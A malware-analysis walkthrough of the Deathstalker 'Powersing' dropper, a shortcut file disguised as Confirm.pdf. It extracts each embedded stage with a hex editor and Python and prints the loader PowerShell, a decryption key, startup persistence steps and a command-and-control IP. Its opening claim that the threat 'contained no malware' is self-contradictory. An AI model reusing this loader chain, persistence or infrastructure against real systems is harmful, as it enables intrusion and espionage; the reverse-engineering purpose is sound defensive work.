## Deathstalker exploit history
Although it was a virus that infected financial institutions, it contained no malware. It appears that this was a "malware-for-hire" program where a company could use it to spy on other comapnies.

## Analyzing the PDF LNK document (shortcut)
1. When right clicking and viewing the properties of *Confirm.pdf*, we see that it's not actually a PDF document, but a shortcut, with a target set to `C:\Windows\System32\cmd.exe`
2. When we open 010 editor and drag the file into it (**note: do not "open with 010 editor", you must open editor first, then drag file for analysis**) we see at the top some normal magic number headers, and then  a call to cmd.exe with some powershell script after it. This by itself is not useful because there are several null-byte hex codes in there, so we can copy the script into a new 010 editor window, find and replace all `0x00` hex null-bytes with empty string, take the formatted script, throw it into Notepad++, and then now we have just the powershell script. We can add line breaks back in by replacing the `;` character with `;\n` and we get a call to `cmd.exe /c powershell -c ...` that looks something like the following:

```powershell
$m='Confirm.pdf.lnk';
$t=[environment]::getenvironmentvariable('tmp');
cp $m $t\$m;
$z=$t+'\'+@(gci -name $t $m -rec)[0];
$a=gc $z|out-string;
$q=$a[($a.length-2350)..$a.length];
[io.file]::WriteAllbytes($t+'\.vbe', $q);
CsCrIpT $t'\.vbe'
```

For reference, if you don't know what a specific powershell command is, you can type in `help <command name>` in a powershell terminal to find out. `gc` = `Get-Content` (an alias for gc, cat, type) and `gci` = `Get-ChildItem` (an alias for gci, ls, dir)
3. The script takes the shortcut file and reads some specific bytes from length-2350 to the end and writes the files to a .vbe script, then executes it

4. We can pull these bytes out of the file by using 010 editor, pressing ctrl+g to "Go to" and then selecting "Decimal" and "From end of file" in the dropdown menus

![010 search from end of file](010-search-from-end-of-file.png)
5. We can highlight this resulting bytes through the end of the file and save it to a new file by going to *File -> Save Selection -> stage1.vbe*

![010 search from end of file bytes](010-search-end-of-file-bytes.png)

6. This appears to be an encrypted VBE script, which is a very easy using available tools online. Here is a link to a python script that can do the job: https://github.com/DidierStevens/DidierStevensSuite/blob/master/decode-vbe.py this script only works on Python2 right now. Running the following command: `python2 decode-vbe.py stage1.vbe > stage1-decoded.vbe` gives an output of the decoded script

7. The top of this decoded vbe script has some boilerplate powershell, but the main parts of it are found around line 59 where it looks like it sets up an ADODB.Stream object and retrieves position 2334 from the current file and copies 403632 bytes to a new file called *Confirm.pdf* - we can go to 010 editor and go to *Edit -> Select Range* and type in the following:

![010 search range](010-search-range.png)

Then press enter and we see that the range has been selected and we can save just that part to a file that is a PDF file that looks like this:

![Confirm decoy PDF file](010-decoy-pdf.png)

8. Immediately after the PDF is pulled from memory, it's opened as a decoy document. Then another selection of bytes is pulled from the lnk document, starting right after the PDF  document, with a starting position of 405966 (next byte after PDF) and size of 338462. We can do the same thing here and extract it from 010 editor and see what it is. It looks like it's some encoded data being saved as a file called *~tmpDF3D.ps1*

9. The first bit of processing we can do on the ps1 file is to add line breaks back in. Disable wordwrap, and replace all `;` with `;\n` and then find where there were `;` inside of strings, and fix the strings so they are correct

10. So now that it looks better, we see that there are defined random strings, and then characters being pulled out of the strings via indexes of them. i.e. `$11II=" S2opwermvjrulokbsk#@ksdf...."[13, 3, 60, 30, 29....]`
So we can copy each line one by one into powershell and reference the variable name that the string is being assigned to like this:

![Stage 2 variable decoding](stage-2-variable-decoding.png)

```powershell
$11II=Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been...
$i111=base 64 encoded string decodes to: SystemRunTimeInteropServicesMarshall::PrTRoStringAuto([SystemRuntimeInteropServiceMarshal]::SecureStringToBSTR($(ConvertTo-SecureString 
$O111=iex
$01Oi=$i111 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($i111));
$1lII=when an unknown printer took a galley of type and scrambled it to make a type speciman book. It has survived not only five centuries but also the leap into electronic typesetting remaining esentially unchanged.
# etc.etc.
```

The easiest way to figure out what the powershell script is eventually going to run (by way of the `iex` command) is to replace what we know is the `iex` variable, `$0111` with something like `Write-Output`. If we replace the instance of the `iex` reference getting executed (in this case, it's this line: `Write-Output(&$0111($i111))  ;`), and then run the whole powershell script and output it to another file we get the decrtpted results.
`.\~.tmpDF3D.ps1 > stage2.ps1` if you get any errors talking about permissions not being correct, you can bypass them by typing in `powershell.exe -ep bypass .\~tmpDF3D.ps1 > stage2.ps1`

We also see as part of the  `.\~tmpDF3D.ps1` script that there is another file that is created called `.\~.tmpDF3E` which has `BinaryStream.Position` written to it. This `BinaryStream.Position` would be the position in bytes right after all the previous calculations we did, so in this case after we did 405966+338462, the next byte would be `0xb5bec`

11. Looking at the decrypted second stage, we see at the top that there is a bunch of C# code, which is totally valid. Once we get past the C# strings, we see that it initializes a new object from the string and calls a method called `$it.chIT()`. Once we lookup this method, we see that the function creates a list of security tools like Wireshark and NMAP and sees if they're installed and returns the result.

12. We can start analyzing the second stage powershell script, and we eventually come across some script that calls `new-object System.IO.BinaryReader` and opens the original file, `Confirm.pdf.lnk`, starting at the offset we found above, `0xb5bec`, and reading 697088 bytes into `$stager2` and reading 8928 bytes into `$dll` and 4286 bytes into `$icon` and 614 bytes into `$vbs_startup`. Writing all the bytes in reverse order to their respective files.

We can write a python script that extracts these bytes individually by doing something like the following:

```python
# extract byte count from offset:
f = open("Confirm.pdf.lnk", "rb") # rb = read binary mode
f.seek(0xb5bec)
>>> 744428
```

Now we can read `$stager2` by starting at 744428 and reading 697088. After the `f.seek` method we can now write:

```python
stager_2 = f.read(697088)
dll = f.read(8928)

stager_2 = stager_2[::-1]
dll = dll[::-1]
```

The next part of the stage 2 powershell script takes the dll bytes and writes them to `$ren_folder\~.tmpDEED.tmp`, which we can do in python using:

```python
g = open("~.tmpDEED.tmp", "wb") # wb = write binary
g.write(dll)
g.close()
```

Then we do similar things for the icon and vbs_startup variables:

```python
icon = f.read(4286)
vbs_startup = f.read(614)

icon = icon[::-1]
vbs_startup = vbs_startup[::-1]

i = open("~.tmpDF40.ico", "wb")
i.write(icon)
i.close()

v = open("~.tmpDF54.vbe", "wb")
v.write(vbs_startup)
v.close()
```

Now we have all our new files, which include some binary data that looks encrypted written to `tmpDEED.tmp`, an icon file that looks like a plain white icon, and an encrypted vbe script that can easily be decrypted using our python vbe script.

13. Going to the next lines of the code, we see a new object initiated from a class called `Networking` which is defined in this file. If we follow it through to `Networking -> UpdateLinks -> sys.CoInitialize` we see that it reads in one of the files we just created from the `$dll` variable above, wrote to file `~.tmpDEED.tmp`, then it seeks to position 7184 then reads 216 bytes, reverses it, base64 decodes it, and returns it. We can do this in python with:

```python
import base64
d = open("~.tmpDEED.tmp", "rb")
d.seek(7184)
str = d.read(216)
results = str[::-1]
decoded = base64.b64decode(results)
print(decoded) # returns what looks like byte code
```

In the powershell prompt it looks like:

![tmp dll decryption](tmp-dll-decryption.png)

These URL's contain the cryptographic key information that is used inside of powersing.

14. On the youtube URL, the description of the video contains some random strings that we saw in the stage2 powershell script, such as *"My keyboard doesn't work.."* looking at the code that called our `sys.CoInitialize()` method, we see it grabs the links, requests all of them, and loops through them to try to find the text *"My keyboard doesn't work.."*, once it does, it extracts the key from the description, which in this case, would be this part of the text on  the youtube video:

```
My keyboard doesnt work.. h.0UjghN*lickP~q#ilY%MY8Jdkjl+22!Ye!\-*miGLI9kHa
```

The text following the string gets stored in `this.KEY`.

15. The next block of code we have does some checking for various different anti-virus products, and if it finds them, it kills the script all together. If it doesn't find them, we make a call to `$sys.make_arch()` which creates a new folder called `~.tmpDF3C`, then creates a `Microsoft Windows Helper.lnk` file stored in the Startup directory, then it takes the `~.tmpDF54.vbe` script and makes a shortcut out of `Microisoft Windows Helper.lnk`, then `cscript.exe`, then the VBE script mentioned above, and the icon extracted above. The decoded VBE script looks pretty much the same as the stage1 VBE script decoded.

16. After the `$sys.make_arch()` function, we have a method called `unpack $net.KEY`. This takes the key found from above's youtube URL and takes the first 32 characters to make the key, and the last 16 bytes to make the IV. In this case this would be:

```python
bytes = b"h.0UjghN*lickP~q#ilY%MY8Jdkjl+22!Ye!\-*miGLI9kHa"
key = bytes[0:32]
iv = bytes[32:]
len(key) # 32
len(iv) # 16
from Crypto.Cipher import AES
c = AES.new(key, AES.MODE_CBC, iv=iv)
stager_2_decrypted = c.decrypt(base64.b64decode(stager_2)) # stager_2 = variable defined above
# outputs a long encrypted string with some powershell code which we can save to a file with
g = open("stage3.encrypted.ps1", "wb")
g.write(stager_2_decrypted)
g.close()
```

17. The newly created `stage3.encrypted.ps1` has some encoded variables in it just like the last stage, where we can take each variable, throw it into powershell, and then call the variable it was assigned to in order to see what it was being decoded to. We can use the same method as above, where we try to find the `iex` command and replace it with `Write-Output`. In this case, the `iex` command belongs to the variable called `$1OiO`. So we can find the last full function usage of this call down at the bottom of the file: `&$1OiO(&$1OiO($1Ii0))` and make it: `Write-Output(&$1OiO($1Ii0))`

This gives us the decrypted output of the file that we can then save with the following command: `powershell.exe -ep bypass .\stage3.encrypted.ps1 > stage3.decrypted.ps1`

18. Looking at the decrypted file, the part where the logic begins is initiating a `New-Object` called `LocalInfo` which grabs some information about the current machine, then we have some more anti-virus checks, followed by another `Networking -> UpdateLinks -> ` initiation like in the other file. Except this one looks for a different magic string, this one looks for the following text: *Yo bro i sing <encoded string> yeah*

So we have a new key which is: `MjM0NzEzMzkyNjM5MzA=`

This gets base64 decoded, and sent to a function called `LongToIP`. The base64 decoded value is: `b'23471339263930'`

The `LongToIP` function first divits the long value by `25835` which is `908509358`, then it does a simple IPv4 calc to convert it back to an IP: `54.38.192.174`

![Stage 3 ip calculation](stage-3-ip-calculation.png)


So all together, the Confirm.pdf.lnk file contains these items in this order byte-by-byte:

* LNK header and shortcut data
* Decoy PDFF document
* Powersing step 1
* Powersing step 2 (encrypted + reversed)
* Opaque data container the dead drop resolver URL's (reversed)
* Icon
* Persistent script
* Stage 0 VBE script
